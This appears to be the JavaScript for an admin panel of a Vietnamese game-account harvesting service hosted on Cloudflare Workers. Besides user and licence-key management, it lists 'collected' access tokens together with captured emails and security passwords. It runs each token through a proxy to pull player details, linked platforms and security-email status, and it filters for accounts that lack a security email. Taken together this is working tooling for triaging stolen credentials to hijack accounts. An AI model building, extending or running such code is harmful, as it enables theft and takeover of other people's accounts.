// API Configuration - Change this to your Cloudflare Worker URL
const API_URL = 'https://vuamxt-admin.phamlongsoftware.workers.dev'; // Will be proxied through Cloudflare Pages Functions

// State management
let authToken = localStorage.getItem('authToken');
let users = [];
let keys = [];
let tokens = [];

// Initialize app
document.addEventListener('DOMContentLoaded', () => {
    checkAuth();
    setupEventListeners();
});

// Check authentication
function checkAuth() {
    if (authToken) {
        showDashboard();
        loadDashboardData();
    } else {
        showLogin();
    }
}

// Setup event listeners
function setupEventListeners() {
    // Login form
    document.getElementById('loginForm').addEventListener('submit', handleLogin);
    
    // Logout button
    document.getElementById('logoutBtn').addEventListener('click', handleLogout);
    
    // Generate keys form
    document.getElementById('genKeyForm').addEventListener('submit', handleGenerateKeys);
    
    // Bulk delete users
    document.getElementById('bulkDeleteUsers').addEventListener('click', handleBulkDeleteUsers);
    
    // Bulk delete keys
    document.getElementById('bulkDeleteKeys').addEventListener('click', handleBulkDeleteKeys);
    
    // Select all checkboxes
    document.getElementById('selectAllUsers').addEventListener('change', (e) => {
        document.querySelectorAll('#usersTableBody input[type="checkbox"]').forEach(cb => cb.checked = e.target.checked);
    });
    
    document.getElementById('selectAllKeys').addEventListener('change', (e) => {
        document.querySelectorAll('#keysTableBody input[type="checkbox"]').forEach(cb => cb.checked = e.target.checked);
    });
    
    // Filter buttons
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', (e) => filterTokens(e.target.dataset.filter));
    });
    
    // Scan all button
    document.getElementById('scanAllBtn').addEventListener('click', scanAllInfo);
    
    // Clear tokens button
    document.getElementById('clearTokensBtn').addEventListener('click', handleClearTokens);
}

// Show login section
function showLogin() {
    document.getElementById('loginSection').style.display = 'block';
    document.getElementById('dashboardSection').style.display = 'none';
}

// Show dashboard section
function showDashboard() {
    document.getElementById('loginSection').style.display = 'none';
    document.getElementById('dashboardSection').style.display = 'block';
}

// Handle login
async function handleLogin(e) {
    e.preventDefault();
    const password = document.getElementById('password').value;
    
    try {
        const response = await fetch(`${API_URL}/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
        });
        
        const data = await response.json();
        
        if (data.success) {
            authToken = data.token;
            localStorage.setItem('authToken', authToken);
            showDashboard();
            loadDashboardData();
        } else {
            document.getElementById('loginError').style.display = 'block';
        }
    } catch (error) {
        console.error('Login error:', error);
        alert('Lỗi kết nối đến server');
    }
}

// Handle logout
function handleLogout() {
    authToken = null;
    localStorage.removeItem('authToken');
    showLogin();
}

// Load dashboard data
async function loadDashboardData() {
    await Promise.all([
        loadUsers(),
        loadKeys(),
        loadTokens()
    ]);
}

// Load users
async function loadUsers() {
    try {
        const response = await fetch(`${API_URL}/users`, {
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        const data = await response.json();
        users = data.users || [];
        renderUsers();
    } catch (error) {
        console.error('Error loading users:', error);
    }
}

// Load keys
async function loadKeys() {
    try {
        const response = await fetch(`${API_URL}/keys`, {
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        const data = await response.json();
        keys = data.keys || [];
        renderKeys();
    } catch (error) {
        console.error('Error loading keys:', error);
    }
}

// Load tokens
async function loadTokens() {
    try {
        const response = await fetch(`${API_URL}/tokens`, {
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        const data = await response.json();
        tokens = data.tokens || [];
        renderTokens();
    } catch (error) {
        console.error('Error loading tokens:', error);
    }
}

// Render users table
function renderUsers() {
    const tbody = document.getElementById('usersTableBody');
    tbody.innerHTML = users.map(user => `
        <tr>
            <td><input type="checkbox" class="user-checkbox" value="${user.id}"></td>
            <td><input type="text" value="${user.username}" data-user-id="${user.id}" data-field="username" style="width:90px"></td>
            <td><input type="text" value="${user.email}" data-user-id="${user.id}" data-field="email" style="width:130px"></td>
            <td>${user.is_pro ? '<span class="tag-status tag-email">PRO VIP</span>' : '<span class="tag-status tag-pending">FREE</span>'}</td>
            <td>
                <button class="btn btn-primary btn-sm update-user-btn" data-user-id="${user.id}"><i class="bi bi-save"></i></button>
                <button class="btn btn-info btn-sm toggle-pro-btn" data-user-id="${user.id}">Gói</button>
            </td>
        </tr>
    `).join('');
    
    // Add event listeners for update buttons
    document.querySelectorAll('.update-user-btn').forEach(btn => {
        btn.addEventListener('click', () => handleUpdateUser(btn.dataset.userId));
    });
    
    // Add event listeners for toggle pro buttons
    document.querySelectorAll('.toggle-pro-btn').forEach(btn => {
        btn.addEventListener('click', () => handleTogglePro(btn.dataset.userId));
    });
}

// Render keys table
function renderKeys() {
    const tbody = document.getElementById('keysTableBody');
    tbody.innerHTML = keys.map(key => `
        <tr>
            <td><input type="checkbox" class="key-checkbox" value="${key.id}"></td>
            <td><code style="color:var(--primary); font-size: 11px;">${key.key_code}</code></td>
            <td>${key.is_used ? '<span class="text-secondary">Đã dùng</span>' : '<span class="text-success">Sẵn sàng</span>'}</td>
        </tr>
    `).join('');
}

// Render tokens list
function renderTokens() {
    const container = document.getElementById('tokensList');
    document.getElementById('tokenCount').textContent = tokens.length;
    
    if (tokens.length === 0) {
        container.innerHTML = `
            <div class="text-center text-muted py-5">
                <i class="bi bi-inbox-fill" style="font-size: 40px; display: block; opacity: 0.2;"></i>
                Chưa có dữ liệu thu thập.
            </div>
        `;
        return;
    }
    
    container.innerHTML = tokens.reverse().map((log, index) => {
        const tk = typeof log === 'object' ? log.token : log;
        const email = typeof log === 'object' ? (log.email || '') : '';
        const secPw = typeof log === 'object' ? (log.sec_pw || '') : '';
        const actionName = typeof log === 'object' ? (log.action || '') : '';
        
        return `
        <div class="gt-acc-item" data-token-val="${tk}" data-email-status="unknown">
            <button class="gt-acc-btn collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#tk-${index}" onclick="loadTokenInfo('${tk}', ${index})">
                <span class="acc-ico"><i class="bi bi-person-circle"></i></span>
                <div style="flex: 1;">
                    <div style="font-family: var(--mono); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 250px;">${tk.substring(0, 35)}...</div>
                    <div class="summary-info" id="sum-${index}">
                        <span class="text-muted small"><i class="bi bi-arrow-repeat spin"></i> Chờ quét...</span>
                    </div>
                </div>
                <i class="bi bi-chevron-down acc-chevron"></i>
            </button>
            <div id="tk-${index}" class="accordion-collapse collapse" data-bs-parent="#tokenAccordion">
                <div class="gt-acc-body">
                    ${email || secPw ? `
                    <div class="mb-3">
                        <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Dữ liệu Capture:</label>
                        <div class="gt-res" style="color:var(--grn); font-weight: bold;">
                            ${email ? `📧 Email: ${email}\n` : ''}
                            ${secPw ? `🔐 SecPW: ${secPw}\n` : ''}
                            ${actionName ? `🎬 Action: ${actionName}\n` : ''}
                        </div>
                    </div>
                    ` : ''}
                    <div class="mb-3">
                        <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Full Access Token:</label>
                        <div class="gt-res" style="color: var(--primary);">${tk}</div>
                    </div>
                    
                    <div class="row g-2">
                        <div class="col-12">
                            <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Dữ liệu tài khoản (Player Info):</label>
                            <div id="pinfo-${index}" class="gt-res">Đang tải...</div>
                        </div>
                        <div class="col-md-6">
                            <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Liên kết (Platforms):</label>
                            <div id="plat-${index}" class="gt-res">Đang tải...</div>
                        </div>
                        <div class="col-md-6">
                            <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Email Bảo mật:</label>
                            <div id="email-${index}" class="gt-res">Đang tải...</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `}).join('');
}

// Handle update user
async function handleUpdateUser(userId) {
    const usernameInput = document.querySelector(`input[data-user-id="${userId}"][data-field="username"]`);
    const emailInput = document.querySelector(`input[data-user-id="${userId}"][data-field="email"]`);
    
    try {
        const response = await fetch(`${API_URL}/users/${userId}`, {
            method: 'PUT',
            headers: { 
                'Authorization': `Bearer ${authToken}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: usernameInput.value,
                email: emailInput.value
            })
        });
        
        if (response.ok) {
            await loadUsers();
        } else {
            alert('Lỗi khi cập nhật user');
        }
    } catch (error) {
        console.error('Error updating user:', error);
        alert('Lỗi kết nối');
    }
}

// Handle toggle pro
async function handleTogglePro(userId) {
    try {
        const response = await fetch(`${API_URL}/users/${userId}/toggle-pro`, {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        
        if (response.ok) {
            await loadUsers();
        }
    } catch (error) {
        console.error('Error toggling pro:', error);
    }
}

// Handle generate keys
async function handleGenerateKeys(e) {
    e.preventDefault();
    const count = parseInt(e.target.count.value);
    
    try {
        const response = await fetch(`${API_URL}/keys/generate`, {
            method: 'POST',
            headers: { 
                'Authorization': `Bearer ${authToken}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ count })
        });
        
        const data = await response.json();
        
        if (data.success) {
            document.getElementById('keys_area').value = data.keys.join('\n');
            document.getElementById('keysModal').style.display = 'block';
            await loadKeys();
        }
    } catch (error) {
        console.error('Error generating keys:', error);
        alert('Lỗi khi tạo keys');
    }
}

// Handle bulk delete users
async function handleBulkDeleteUsers() {
    const selectedIds = Array.from(document.querySelectorAll('.user-checkbox:checked')).map(cb => cb.value);
    
    if (selectedIds.length === 0) return;
    
    try {
        const response = await fetch(`${API_URL}/users/bulk-delete`, {
            method: 'POST',
            headers: { 
                'Authorization': `Bearer ${authToken}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ids: selectedIds })
        });
        
        if (response.ok) {
            await loadUsers();
        }
    } catch (error) {
        console.error('Error deleting users:', error);
        alert('Lỗi khi xóa users');
    }
}

// Handle bulk delete keys
async function handleBulkDeleteKeys() {
    const selectedIds = Array.from(document.querySelectorAll('.key-checkbox:checked')).map(cb => cb.value);
    
    if (selectedIds.length === 0) return;
    
    try {
        const response = await fetch(`${API_URL}/keys/bulk-delete`, {
            method: 'POST',
            headers: { 
                'Authorization': `Bearer ${authToken}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ids: selectedIds })
        });
        
        if (response.ok) {
            await loadKeys();
        }
    } catch (error) {
        console.error('Error deleting keys:', error);
        alert('Lỗi khi xóa keys');
    }
}

// Handle clear tokens
async function handleClearTokens() {
    try {
        const response = await fetch(`${API_URL}/tokens/clear`, {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        
        if (response.ok) {
            await loadTokens();
        }
    } catch (error) {
        console.error('Error clearing tokens:', error);
    }
}

// Load token info via API proxy
async function loadTokenInfo(token, idx) {
    const pEl = document.getElementById(`pinfo-${idx}`);
    const plEl = document.getElementById(`plat-${idx}`);
    const emEl = document.getElementById(`email-${idx}`);
    const sumEl = document.getElementById(`sum-${idx}`);
    const parent = document.querySelector(`[data-bs-target="#tk-${idx}"]`).parentElement;

    if (pEl.dataset.loaded === "true") return;

    try {
        // 1. Fetch Player Info
        const r1 = await apiCall({ action: 'access_to_jwt', access_token: token });
        if (r1.ok) {
            pEl.textContent = JSON.stringify(r1.data.decoded, null, 2);
            const nick = r1.data.decoded.nickname || 'Unknown';
            const reg = r1.data.decoded.lock_region || r1.data.decoded.region || '??';
            sumEl.innerHTML = `<span><i class="bi bi-person-fill"></i> ${nick}</span> <span class="badge bg-secondary">${reg}</span>`;
        } else { pEl.textContent = "Lỗi: " + r1.msg; }

        // 2. Fetch Platforms
        const r2 = await apiCall({ action: 'check_platforms', access_token: token });
        if (r2.ok) {
            plEl.textContent = JSON.stringify(r2.data, null, 2);
            if(r2.data.main) sumEl.innerHTML += ` <span class="badge bg-primary">${r2.data.main}</span>`;
        } else { plEl.textContent = "Lỗi: " + r2.msg; }

        // 3. Fetch Email Status
        const r3 = await apiCall({ action: 'check_email', access_token: token });
        if (r3.ok) {
            emEl.textContent = JSON.stringify(r3.data, null, 2);
            let tag = '';
            if (r3.data.email) {
                tag = '<span class="tag-status tag-email">CÓ EMAIL</span>';
                parent.setAttribute('data-email-status', 'has-email');
            } else if (r3.data.pending) {
                tag = `<span class="tag-status tag-pending">PENDING (${r3.data.countdown}s)</span>`;
                parent.setAttribute('data-email-status', 'pending');
            } else {
                tag = '<span class="tag-status tag-no-email">KHÔNG EMAIL</span>';
                parent.setAttribute('data-email-status', 'no-email');
            }
            sumEl.innerHTML += ' ' + tag;
        } else { emEl.textContent = "Lỗi: " + r3.msg; }

        pEl.dataset.loaded = "true";
    } catch (e) {
        pEl.textContent = "Lỗi kết nối: " + e.message;
    }
}

// API call to proxy
async function apiCall(payload) {
    const response = await fetch(`${API_URL}/proxy`, {
        method: 'POST',
        headers: { 
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
    return response.json();
}

// Scan all info
async function scanAllInfo() {
    const items = document.querySelectorAll('.gt-acc-item');
    for (let i = 0; i < items.length; i++) {
        const token = items[i].getAttribute('data-token-val');
        const btn = items[i].querySelector('.gt-acc-btn');
        const targetId = btn.getAttribute('data-bs-target');
        const idx = targetId.split('-')[1];
        
        await loadTokenInfo(token, idx);
        await new Promise(r => setTimeout(r, 200));
    }
    alert('Đã quét xong toàn bộ danh sách!');
}

// Filter tokens
function filterTokens(type) {
    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
    event.target.classList.add('active');

    const items = document.querySelectorAll('.gt-acc-item');
    items.forEach(item => {
        const status = item.getAttribute('data-email-status');
        if (type === 'all') {
            item.style.display = 'block';
        } else if (type === status) {
            item.style.display = 'block';
        } else {
            item.style.display = 'none';
        }
    });
}

// Copy keys
function copyKeys() {
    document.getElementById('keys_area').select();
    document.execCommand('copy');
    alert('Đã copy danh sách key!');
}
